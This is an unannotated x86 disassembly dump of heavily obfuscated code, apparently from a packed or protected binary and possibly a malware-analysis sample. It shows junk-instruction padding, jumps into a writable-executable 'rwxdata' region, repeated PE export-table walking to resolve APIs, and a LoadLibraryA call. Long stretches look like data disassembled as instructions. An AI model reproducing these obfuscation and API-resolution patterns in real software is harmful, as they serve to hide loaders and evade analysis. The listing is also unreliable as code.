mov edi 0x1bec6f98
and bh dl
0x8837c047 0x9eca
sub_24bedd
pushad
lea esp [ esp + 0x30 ]
ja rwxdata
cmc
call sub_4fea6f
mov [ esp + 0x24 ] 0x47586ff8
push [ esp + 0x4 ]
mov [ esp + 0x4 ] 0x71
pushfd
push eax
lea esp [ esp + 0x30 ]
jmp rwxdata
pushfd
lea esp [ esp + 0x4 ]
jb rwxdata
pushfd
pushad
mov [ esp + 0x8 ] sp
mov [ esp + 0x20 ] ecx
call sub_512539
jmp rwxdata
bt sp 0x1
cmp [ edi - 0x1 ] 0x0
jg rwxdata
cmp ecx [ ebp - 0x8 ]
jmp rwxdata
jmp rwxdata
push 0xdedb3047
lea esp [ esp + 0x4 ]
jne rwxdata
pushfd
lea esp [ esp + 0x4 ]
jbe rwxdata
jne rwxdata
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
sar di cl
movzx di al
pushad
mov edi [ edx + 0x24 ]
mov [ esp ] bl
mov [ esp ] 0x20
cmp al 0x5d
add edi eax
test bx 0x2c2b
clc
movzx ecx [ edi + ecx * 2 ]
mov [ esp ] 0x72ca
cmp cx bp
bswap di
sar di 0xf
mov edi [ edx + 0x1c ]
bt bp 0x7
mov [ esp + 0x4 ] dx
pushad
add edi eax
test sp cx
push [ esp + 0x4 ]
test ch 0xa7
bt esp edi
mov edi [ edi + ecx * 4 ]
bt di 0xf
mov [ esp + 0x20 ] bh
push 0x6c34ec4a
clc
test edi edi
pushfd
pushfd
lea esp [ esp + 0x50 ]
je rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
ror di 0xe
lea edi [ 0xfffffffff59e35a9 ]
shr di 0xd
pushad
sub ecx 0x1
sub si cx
push ecx
bts di ax
mov [ ebp - 0x4 ] ecx
sub esp 0xffffffdc
shrd cx ax 0x6
not di
add esi 0x9f840703
mov ecx [ ebp - 0x8 ]
xadd si di
sar di 0xc
bts edi eax
add ecx [ ebp - 0x4 ]
pushfd
btr si si
not di
shr ecx 0x1
lea edi [ edx - 0x25f4a10 ]
bswap di
movsx di dl
stc
mov edi [ ebx + ecx * 4 ]
bsf si cx
bsf esi ebp
or si 0xe2a8
add edi eax
push [ esp ]
not esi
pop esi
pop esi
mov esi [ ebp + 0xc ]
cmp bx ax
bsf edi esp
mov edi [ edx + 0x24 ]
bt esi 0xb
test cl bl
pushad
pushfd
add edi eax
stc
cmc
movzx ecx [ edi + ecx * 2 ]
inc edi
pop edi
mov edi [ edx + 0x1c ]
mov [ esp ] 0x31
bt si 0x2
add edi eax
call sub_24b895
stc
add eax edi
jmp rwxdata
clc
call sub_4db742
jmp sub_4dd074
sub_24c005
pushad
cmp edi ebx
pushfd
pushfd
jmp rwxdata
jmp rwxdata
lea esp [ esp + 0x2c ]
ja rwxdata
cmc
cmc
sub edi 0x4
cmc
test al cl
push [ edi ]
stc
stc
stc
cmp edi ebx
pushfd
push 0x527ea9cf
call sub_4d557e
call sub_4de546
sbb al 0xe7
mov al dh
sub ebx edi
sbb di si
add ebx esp
bsf edi eax
bswap edi
mov edi ebx
adc al 0x45
neg al
rol al 0x1
mov al 0x2e
pushfd
[ edi ]
pushad
pushad
mov [ esp + 0xc ] cx
mov esp esi
pushad
pushad
pushfd
push ebp
lea esp [ esp + 0x48 ]
jmp rwxdata
lea eax [ ebx - 0x6044d279 ]
mov [ edi - 0x1 ] 0x0
mov ax 0x200
cwde
push ebx
pushad
call sub_4fd432
stosb [ edi ]
sub [ ebx + ebx * 2 + 0x5a9237c0 ] 0xffffff9d
mov edx 0x40becda2
ja rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
add edx [ 0xffffffffdcbd74df ]
jg rwxdata
xor [ ebx - 0x13 ] bh
mov ebp 0x6fa76782
jne rwxdata
mov eax eax
cli
lds ebx [ ebx + 0x3f23428b ]
pushad
ja rwxdata
push 0xf046c6d2
pushfd
push 0x9d07d799
lea esp [ esp + 0x30 ]
jne rwxdata
shl [ eax - 0x510d63d2 ] 0x60
or [ ebx - 0x28 ] ecx
das
and bh dl
enter 0xf68a 0xa
retn
adc [ esi + 0x5b ] 0x1295dde5
getsec
movsd [ edi ] [ esi ]
insb
pop ds
mov [ esi ] 0x3ef52af
adc eax 0xdcbd74df
cli
sbb [ ecx + 0x29659653 ] dh
or [ esi - 0xd ] eax
int1
cmp cl [ ebx - 0x643a0540 ]
mov eax [ edx + 0x23 ]
aas
fmul [ ecx - 0x2c ]
movsd [ edi ] [ esi ]
mov [ ecx + esi * 8 - 0x13 ] ebp
cdq
xor [ edi ] ecx
sub esp [ eax ]
sub eax 0x39626fc4
cmpsd [ esi ] [ edi ]
in eax dx
mov edx 0x6275ae8f
jecxz rwxdata
sbb ebp [ 0x7c410b5 ]
lahf
rcl [ eax ] 0xda
or dh [ esi ]
jae rwxdata
retn 0x1405
pop ebx
mov eax [ 0x3cac55dc ]
dec esi
sbb [ esi ] ah
rcr [ ebx - 0x15 ] 0x2a
mov edi 0x9c5205c0
fcomp [ edx ]
jns rwxdata
adc ebx [ ebp + ecx * 4 + 0xf502464 ]
test dl dl
out dx eax
salc
imul eax edx 0xe457e574
push esi
inc ecx
jecxz rwxdata
movsb [ edi ] [ esi ]
and esi esi
cld
leave
mov edi 0xf386a88d
cmp [ ebx + 0x56729367 ] 0xdb449e00
aam 0xf0
sbb bh [ ecx + 0x41 ]
jl rwxdata
mov bh 0xa5
dec esp
cmp eax [ ebx - 0x6f5fcd81 ]
clc
xor eax 0x52f96d0e
nop ebx ebp
add [ esi - 0xf2b24bc ] bl
out 0xe1 al
pop eax
mov eax [ 0x490bda10 ]
xchg esi eax
loope rwxdata
shr [ edi ] 0x35
sub ah [ ecx + 0xa ]
daa
mov esp 0xd54b6c95
xor [ ecx + 0x26abac29 ] al
loope rwxdata
dec edi
dec esp
inc ebp
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ ebp - 0x51ea082 ] bh
inc esp
push 0xe434a189
push esp
mov [ esi ] edi
adc edx ecx
sub [ edi - 0x73 ] bl
imul ebx [ edi - 0x53 ] 0xffffffe0
jg rwxdata
bswap edx
sbb al 0xeb
iretd
sub_24c1b3
clc
cmp ecx [ edx + 0x14 ]
pushfd
push esi
pushad
lea esp [ esp + 0x30 ]
jae rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
push 0x557c97ea
push 0x9a12beb3
mov [ esp ] 0xee
push 0xda784da3
lea esp [ esp + 0xc ]
jmp rwxdata
jmp rwxdata
mov edi [ edx + 0x1c ]
stc
add edi eax
cmp di 0x1c1b
stc
pushad
pushfd
mov edi [ edi + ecx * 4 ]
pushfd
push [ esp ]
test edi edi
jmp sub_4d6ea2
sub_24c1f3
mov [ esp ] 0x78
mov [ esp + 0x4 ] al
lea esp [ esp + 0x8 ]
jae rwxdata
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
bsr bx ax
or ch 0xca
adc bl bh
mov ebx eax
sar di cl
mov edi eax
test ah 0xfe
mov ecx 0x104
cmp cl 0x4f
push 0xadcc1572
mov [ esp ] 0xbcb7
sub al al
pushfd
pushad
[ edi ]
push ebp
push ecx
pushfd
lea esp [ esp + 0x34 ]
jne rwxdata
bswap edx
sub dx cx
xor eax eax
call sub_249887
pushad
lea esp [ esp + 0x24 ]
je rwxdata
xor bh 0x4
cmp dl al
mov bx [ esi ]
jmp rwxdata
bt bp 0x8
bt cx 0x1
cmp ebx 0x3
call sub_4d309e
pushfd
call sub_4d5231
jne rwxdata
and ebx 0xfff
bt bx di
push eax
add [ ebx + edi ] dx
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
push esp
xchg cl bl
xor ah cl
in eax dx
push edi
fidiv [ edi - 0x791cdd6e ]
shl [ ebp + ebp - 0x605d5fe9 ] 0x56
out 0x1e eax
pushad
add esi 0x2
pushfd
dec ecx
jmp sub_4dbbbe
jle rwxdata
mov [ 0x1ee7569f ] al
fiadd [ ecx ]
out 0xba eax
scasd [ edi ]
xor eax 0xa639be9d
or eax 0x471035af
jns rwxdata
mov edx 0xbe9d35af
cmp [ esi + 0x35af0d67 ] esp
adc [ edi + 0x79 ] al
xchg ebx eax
retn
fidiv [ ecx ]
push es
jns rwxdata
jno rwxdata
pop eax
stosb [ edi ]
mov ch 0x22
jbe rwxdata
xchg [ edi + edx + 0x4b5c2f2c ] dl
push edi
outsd
push es
mov edi 0x8652457e
fstp [ eax - 0x23 ]
pop ecx
mov ds bp
movsb [ edi ] [ esi ]
jns rwxdata
cmpsd [ esi ] [ edi ]
aam 0x1
adc [ ebp + 0x71 ] ah
outsd
mov edx 0x3dbda043
cmc
dec esp
jns rwxdata
xchg ecx eax
xor [ ebx - 0x2aeb68af ] dh
dec edx
inc ecx
xor edi ebx
pop ds
lds ecx [ ebp - 0x299093c0 ]
mov bl 0xd9
loopne rwxdata
sbb al 0x7
mov eax 0x742b4818
mov esp 0xbee253a3
xor ah [ ebx ]
shl [ 0x79550f8f ] cl
adc esi ebx
xor dh [ ebp + 0x31a258a ]
iretd
test [ edx - 0x605d9435 ] 0xa126aa2f
xchg esp eax
xor eax 0x2dcaa901
int 0x49
in eax dx
aad 0x14
iretd
mov bl 0x9d
jle rwxdata
or [ ecx + 0x1dcfd9c6 ] esp
sti
push es
fwait
and [ edi - 0xfbf2af1 ] esi
adc [ ebp + 0x449efc98 ] cl
test dl dl
int 0x52
xchg edx eax
pop ss
sub al 0x2f
pop esp
dec ebx
add dh [ ecx + 0x6c ]
shl eax 0x42
sbb [ esp ] 0x79
or [ esp + ebx + 0x3286f387 ] bl
cwde
push es
insb
aas
lodsd [ esi ]
test [ esi ] esp
sub al 0x5b
scasd [ edi ]
and eax ecx
mov bl 0xbc
dec ebx
push esp
sub edi ecx
xchg esi eax
fcomp [ edx ]
xchg esi eax
mov bh 0x32
fld st1
daa
dec edi
stosb [ edi ]
xor ecx [ eax ]
out dx al
or bl [ eax + 0x28 ]
jl rwxdata
push ss
loopne rwxdata
xchg esp eax
imul ecx [ edi - 0x34d3366e ] 0x2cba31b3
adc dh [ edx + esi - 0xe4ec9e3 ]
cli
inc edx
inc ebx
adc al 0xd1
int 0xee
adc eax 0xd4f4cfc8
int3
in eax dx
xchg [ ebp + 0x5ebd40f5 ] esi
retn
sub_4d295f
sub eax eax
push 0x88f4816e
pushad
lea esp [ esp + 0x28 ]
call sub_24a185
jmp rwxdata
pushfd
call sub_4d5231
jne rwxdata
push esp
xchg cl bl
xor ah cl
in eax dx
push edi
fidiv [ edi - 0x791cdd6e ]
shl [ ebp + ebp - 0x605d5fe9 ] 0x56
out 0x1e eax
jle rwxdata
mov [ 0x1ee7569f ] al
fiadd [ ecx ]
out 0xba eax
scasd [ edi ]
xor eax 0xa639be9d
or eax 0x471035af
jns rwxdata
mov edx 0xbe9d35af
cmp [ esi + 0x35af0d67 ] esp
adc [ edi + 0x79 ] al
xchg ebx eax
retn
fidiv [ ecx ]
push es
jns rwxdata
jno rwxdata
pop eax
stosb [ edi ]
mov ch 0x22
jbe rwxdata
xchg [ edi + edx + 0x4b5c2f2c ] dl
push edi
outsd
push es
mov edi 0x8652457e
fstp [ eax - 0x23 ]
pop ecx
mov ds bp
movsb [ edi ] [ esi ]
jns rwxdata
cmpsd [ esi ] [ edi ]
aam 0x1
adc [ ebp + 0x71 ] ah
outsd
mov edx 0x3dbda043
cmc
dec esp
jns rwxdata
xchg ecx eax
xor [ ebx - 0x2aeb68af ] dh
dec edx
inc ecx
xor edi ebx
pop ds
lds ecx [ ebp - 0x299093c0 ]
mov bl 0xd9
loopne rwxdata
sbb al 0x7
mov eax 0x742b4818
mov esp 0xbee253a3
xor ah [ ebx ]
shl [ 0x79550f8f ] cl
adc esi ebx
xor dh [ ebp + 0x31a258a ]
iretd
test [ edx - 0x605d9435 ] 0xa126aa2f
xchg esp eax
xor eax 0x2dcaa901
int 0x49
in eax dx
aad 0x14
iretd
mov bl 0x9d
jle rwxdata
or [ ecx + 0x1dcfd9c6 ] esp
sti
push es
fwait
and [ edi - 0xfbf2af1 ] esi
adc [ ebp + 0x449efc98 ] cl
test dl dl
int 0x52
xchg edx eax
pop ss
sub al 0x2f
pop esp
dec ebx
add dh [ ecx + 0x6c ]
shl eax 0x42
sbb [ esp ] 0x79
or [ esp + ebx + 0x3286f387 ] bl
cwde
push es
insb
aas
lodsd [ esi ]
test [ esi ] esp
sub al 0x5b
scasd [ edi ]
and eax ecx
mov bl 0xbc
dec ebx
push esp
sub edi ecx
xchg esi eax
fcomp [ edx ]
xchg esi eax
mov bh 0x32
fld st1
daa
dec edi
stosb [ edi ]
xor ecx [ eax ]
out dx al
or bl [ eax + 0x28 ]
jl rwxdata
push ss
loopne rwxdata
xchg esp eax
imul ecx [ edi - 0x34d3366e ] 0x2cba31b3
adc dh [ edx + esi - 0xe4ec9e3 ]
cli
inc edx
inc ebx
adc al 0xd1
int 0xee
adc eax 0xd4f4cfc8
int3
in eax dx
xchg [ ebp + 0x5ebd40f5 ] esi
retn
sub_4d29c2
movzx di cl
mov edi eax
push edx
mov [ esp ] 0x95
push [ esp ]
pushad
lea esp [ esp + 0x34 ]
jmp rwxdata
bts cx 0xb
rol cl 0x2
shr cl 0x1
mov ecx 0x104
cmp dl dl
push eax
pushad
sub al al
cmp sp dx
[ edi ]
mov [ esp ] esi
lea esp [ esp + 0x24 ]
js rwxdata
push ebx
call sub_4fd5ab
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
ror ecx cl
sub si 0x68b9
mov ecx edi
cmc
or esi edi
mov si 0x84bb
bts esi esi
sub ecx ebx
btr si bp
clc
mov esi esp
cmc
cmc
sub edi 0x4
cmc
test al cl
push [ edi ]
stc
stc
stc
cmp edi ebx
pushfd
push 0x527ea9cf
call sub_4d557e
call sub_4de546
sub_4d2d07
call sub_4ddd41
cmp al 0xfd
imul ebx [ edx + 0x2b ] 0x1ce5547f
rcr [ ebx ] 0x97
xor bh ch
mov dh 0x32
xchg ebp eax
mov [ ecx ] bh
leave
or al 0xb
movsb [ edi ] [ esi ]
dec esp
bound edx [ ecx - 0x7f6cbf6 ]
insd
test [ ecx + 0x75d41850 ] ah
mov ch 0x6
dec eax
mov dl 0xed
add [ 0x1334ad42 ] dl
jg rwxdata
dec edi
cmpsb [ esi ] [ edi ]
jns rwxdata
jg rwxdata
popad
and bl bh
scasb [ edi ]
jbe rwxdata
jns rwxdata
0xe548
mov [ ecx ] cs
dec ebx
je rwxdata
aam 0x75
sub_4d2e7d
lea esp [ esp + 0x14 ]
jne rwxdata
pushad
mov [ esp + 0xc ] cx
mov esp esi
pushad
pushad
pushfd
push ebp
lea esp [ esp + 0x48 ]
jmp rwxdata
lahf
push 0xd53bb4f6
mov [ edi - 0x1 ] 0x0
movzx ax dl
pushad
mov [ esp + 0x20 ] ebx
lahf
pushad
push edi
lea eax [ rwxdata ]
lea esp [ esp + 0x44 ]
jne rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
push edx
jmp rwxdata
push 0x2c1d31d1
push ebp
mov [ esp + 0x4 ] rwxdata
call sub_4d553d
or al al
jmp rwxdata
pushad
mov [ esp ] 0x92
mov [ esp + 0x20 ] rwxdata
pushad
call sub_4dd8a2
pushfd
pushfd
jmp rwxdata
lea esp [ esp + 0x28 ]
je rwxdata
bt di dx
or ah ah
push 0x13376c9e
lea esp [ esp + 0x4 ]
je rwxdata
stc
cmp al ah
call sub_4da2d3
mov edi [ edx + 0x1c ]
stc
add edi eax
cmp di 0x1c1b
stc
pushad
pushfd
mov edi [ edi + ecx * 4 ]
pushfd
push [ esp ]
test edi edi
jmp sub_4d6ea2
push ecx
jmp rwxdata
jo rwxdata
pushad
push [ esp + 0x24 ]
retn 0x28
clc
test bx si
pushfd
cmp ah 0x2e
pushad
pushfd
push [ esp + 0x28 ]
retn 0x2c
cmp ah 0x2e
sub_4d2f01
mov [ esp + 0x4 ] dh
pushad
lea esp [ esp + 0x28 ]
jne rwxdata
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
aas
btr ax 0xb
shrd ax cx cl
xor edx edx
test di cx
mov eax edx
sar al cl
add edi 0x1
shl al cl
mov al [ edi ]
jmp rwxdata
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
bt dx sp
jmp rwxdata
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
test al al
pushfd
push eax
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
setle cl
rol cl cl
stc
btr cx 0x3
mov edi edx
push ecx
sub al 0x30
pushad
push [ esp + 0x4 ]
lea esp [ esp + 0x28 ]
jmp rwxdata
cmc
cmp al 0x9
jmp sub_2499a2
sub_4d2f2f
inc al
pushfd
stc
mov [ esp ] 0x3f
neg al
test ah 0xb9
stc
mov [ esp ] ch
mov [ ecx ] al
stc
add ecx 0x1
test bh al
test ah ah
pushfd
mov [ esp + 0xc ] 0x4658
lea esp [ esp + 0x3c ]
jne rwxdata
not al
setae al
mov al [ ecx ]
jmp rwxdata
pushfd
mov [ esp ] 0x7a
mov [ esp ] edi
pushad
mov [ esp ] bh
pushad
push ecx
mov [ esp + 0x40 ] ebx
mov [ esp + 0xc ] eax
push ebx
jmp rwxdata
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
call sub_24b6d3
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
sub_4d308f
lea esp [ esp + 0xc ]
je rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
jmp rwxdata
jmp rwxdata
pushfd
add eax edi
push 0xf31c851
stc
push [ esp + 0x4 ]
mov [ esp ] 0x64
cmp eax edx
jmp sub_4d7c22
sub_4d309e
mov [ esp ] 0xb0
pushfd
push [ esp + 0x4 ]
lea esp [ esp + 0xc ]
je rwxdata
rcl bl cl
bt dx ax
setns bh
or bh 0x72
mov bx [ esi ]
bt si cx
and ebx 0xfff
push 0x937b8bb9
mov [ esp ] cl
add [ ebx + edi ] edx
lea esp [ esp + 0x4 ]
push ebx
push [ esp ]
push [ esp ]
lea esp [ esp + 0xc ]
jmp rwxdata
pushad
add esi 0x2
pushfd
dec ecx
jmp sub_4dbbbe
sub_4d30c1
sub ebx edi
bsr di cx
cmc
lea esp [ esp + 0x4 ]
add ebx esp
bsf di ax
push eax
pushfd
call sub_4d8764
push edi
lea esp [ esp + 0x30 ]
jb rwxdata
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
pushfd
cmc
jmp rwxdata
pushfd
cmp eax [ ebp - 0x10 ]
mov [ esp + 0x4 ] ch
lea esp [ esp + 0x8 ]
jae rwxdata
shr bh cl
xor bh bl
add ecx edx
sub ebx 0xaf286f76
mov ebx eax
bts cx di
dec cl
mov edi eax
bts cx 0xb
rol cl 0x2
shr cl 0x1
mov ecx 0x104
cmp dl dl
push eax
pushad
sub al al
cmp sp dx
[ edi ]
mov [ esp ] esi
lea esp [ esp + 0x24 ]
js rwxdata
push ebx
call sub_4fd5ab
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
bswap edx
sub dx cx
xor eax eax
ror ecx cl
sub si 0x68b9
mov ecx edi
cmc
or esi edi
mov si 0x84bb
bts esi esi
sub ecx ebx
btr si bp
clc
mov esi esp
cmc
cmc
sub edi 0x4
cmc
test al cl
push [ edi ]
stc
stc
stc
cmp edi ebx
pushfd
push 0x527ea9cf
call sub_4d557e
call sub_4de546
sub_4d32ba
mov [ esp + 0x28 ] 0x4deca75d
pushfd
pushfd
mov [ esp + 0x8 ] 0x2a
pushfd
lea esp [ esp + 0x34 ]
jmp rwxdata
jmp rwxdata
pushfd
pushfd
pushfd
mov [ esp + 0x8 ] ecx
jmp rwxdata
mov [ esp + 0x4 ] ebp
mov [ esp ] 0x99e3
call sub_511716
pushad
jmp rwxdata
mov [ esp + 0x1c ] ebx
call sub_5135eb
sub_4d33e1
call sub_4d6e19
bt ax 0x1
stc
clc
[ edi ]
push [ esp ]
call j_sub_4fe64b
loop rwxdata
cmp al 0x1b
mov dh 0x36
xchg ecx eax
sbb eax 0xaab30b8
adc al 0xc0
sbb ecx edi
or bh [ edx + 0x10dab91d ]
fimul [ edx + 0x40a8dd10 ]
rcl [ ecx ] cl
mov dl 0x9c
adc eax 0x7fc7ea3f
movsx ebx bp
push ecx
0xa358255 0xada3
outsb
retn
sub_4d35f3
mov [ esp + 0x4 ] 0xcb
cmp edi 0x4dfae9d4
sub al 0x34
mov [ esp ] esp
call sub_4d33e1
jmp rwxdata
jne rwxdata
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
cmp bx ax
bsf edi esp
mov edi [ edx + 0x24 ]
bt esi 0xb
test cl bl
pushad
pushfd
add edi eax
stc
cmc
movzx ecx [ edi + ecx * 2 ]
inc edi
pop edi
mov edi [ edx + 0x1c ]
mov [ esp ] 0x31
bt si 0x2
add edi eax
call sub_24b895
sub_4d360d
lea esp [ esp + 0x4 ]
jl rwxdata
pushad
push ebx
mov [ esp ] 0x2a21
call sub_4fdbf6
int3
pushad
lea esp [ esp + 0x20 ]
jb rwxdata
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
bt dx 0x6
test bh 0x68
cmp eax [ ebp - 0x10 ]
pushfd
pushad
jmp rwxdata
push 0xb98f48a4
lea esp [ esp + 0x28 ]
jae rwxdata
and bh 0x3a
shld bx bx cl
call sub_4dd905
inc ebx
in al 0x41
mov al 0x9d
push esp
pop esp
jge rwxdata
popad
lds esp [ edi - 0x572215af ]
xor [ ebx ] edx
movsb [ edi ] [ esi ]
scasb [ edi ]
0x6e26
sub_4d3783
not di
lea esi [ esi + edx + 0x1c ]
pushfd
call sub_4d56c9
lea esp [ esp + 0x20 ]
ja rwxdata
pushad
mov [ esp + 0xc ] cx
mov esp esi
pushad
pushad
pushfd
push ebp
lea esp [ esp + 0x48 ]
jmp rwxdata
stc
imul edx edx 0xa
jns rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
cmp bp bp
stc
cmc
test al dl
add edx eax
pushfd
mov [ esp ] esi
pushfd
push ebx
lea esp [ esp + 0xc ]
jmp sub_4db31d
cmp cl bh
add edx eax
pushad
lea esp [ esp + 0x20 ]
jmp sub_4db31d
sub_4d41a5
push 0x69e344f9
bt si 0x6
call sub_24b6e1
jmp rwxdata
lea esp [ esp + 0x20 ]
ja rwxdata
pushad
mov [ esp + 0xc ] cx
mov esp esi
pushad
pushad
pushfd
push ebp
lea esp [ esp + 0x48 ]
jmp rwxdata
stc
imul edx edx 0xa
jns rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
cmp bp bp
stc
cmc
test al dl
add edx eax
pushfd
mov [ esp ] esi
pushfd
push ebx
lea esp [ esp + 0xc ]
jmp sub_4db31d
cmp cl bh
add edx eax
pushad
lea esp [ esp + 0x20 ]
jmp sub_4db31d
sub_4d45ed
lea esp [ esp + 0x30 ]
jb rwxdata
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
pushfd
mov [ esp ] dx
cmp eax [ ebp - 0x10 ]
call sub_24c1f3
cmp al 0xbb
sti
not [ ebx + 0x27 ]
dec eax
mov [ 0x2b8f90a0 ] eax
pop esi
imul ebx [ ecx - 0x79b8021c ] 0x172e24bb
out dx al
dec edi
cmpsb [ esi ] [ edi ]
mov bl 0x42
lea esp [ edx + 0x3acb42b3 ]
mov ch 0x8a
popad
push edx
xor [ eax + 0x7b0b53a7 ] edx
mov ebp [ edi + 0x35 ]
popfd
mov dl 0x23
sub eax 0xc6771b9
sbb ecx ebp
and dl [ ebp - 0x7f ]
cmp [ eax ] ecx
and eax edx
adc [ edx ] ah
0x736a
sub_4d47ea
lea esp [ esp + 0x8 ]
jne rwxdata
push eax
jmp rwxdata
bts cx si
btr cx dx
pushfd
rcr ch 0x3
mov ecx [ ebx ]
push eax
or ecx ecx
push ebx
push 0xdb4a1ed6
pushfd
lea esp [ esp + 0x14 ]
je rwxdata
clc
mov [ esp ] 0x84
xor eax eax
add esp 0x4
jmp rwxdata
jbe rwxdata
or ebx ebx
jmp sub_4da277
bswap dx
mov di 0x9bc6
movzx edi cl
not dl
lea edx [ ebx + 0x4 ]
pushfd
movzx si al
not di
movzx di al
movzx esi [ edx + 0x1a ]
pushfd
lea esi [ esi + edx + 0x1c ]
pop edi
mov edi [ ebp + 0x8 ]
push [ esp ]
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x2fbd
push 0x6a5a8eef
lea esp [ esp + 0xc ]
call sub_4dd2bf
pushad
push [ esp + 0x8 ]
call sub_4fd86a
lea edx [ ebx + 0x4 ]
lea esp [ esp + 0x4 ]
xchg si di
call sub_4dd0e7
jmp [ LoadLibraryA@IAT ]
movzx di dl
lea edx [ ebx + 0x4 ]
jmp rwxdata
xchg si di
call sub_4da19f
sub_4d49f2
lea esp [ esp + 0x38 ]
jne rwxdata
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
bsr ax si
shrd ax dx cl
sub edx edx
pushad
sar ax 0x2
mov eax edx
cmp dx dx
mov al 0x6a
shr al 0x1
call sub_2472a5
jmp rwxdata
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
mov [ esp ] sp
lea eax [ rwxdata ]
pushad
push 0x57864fdd
call sub_4d73ad
lea ebp [ esi + 0x12e3668f ]
0xae18
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
sub_4d4aeb
pushfd
mov [ esp + 0x4 ] ebx
lea esp [ esp + 0x8 ]
jb rwxdata
jmp rwxdata
stc
stc
bt bx 0x1
cmc
cmp [ edi - 0x1 ] 0x0
jmp rwxdata
cmp ecx [ ebp - 0x8 ]
jmp rwxdata
jne rwxdata
pushfd
lea esp [ esp + 0x4 ]
jbe rwxdata
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
bsf edi esi
rcl di 0xe
xor di cx
bt sp si
mov edi [ edx + 0x24 ]
test cl ah
add edi eax
test esp ebx
pushfd
cmc
test dh 0x82
movzx ecx [ edi + ecx * 2 ]
lea esp [ esp + 0x4 ]
jmp rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
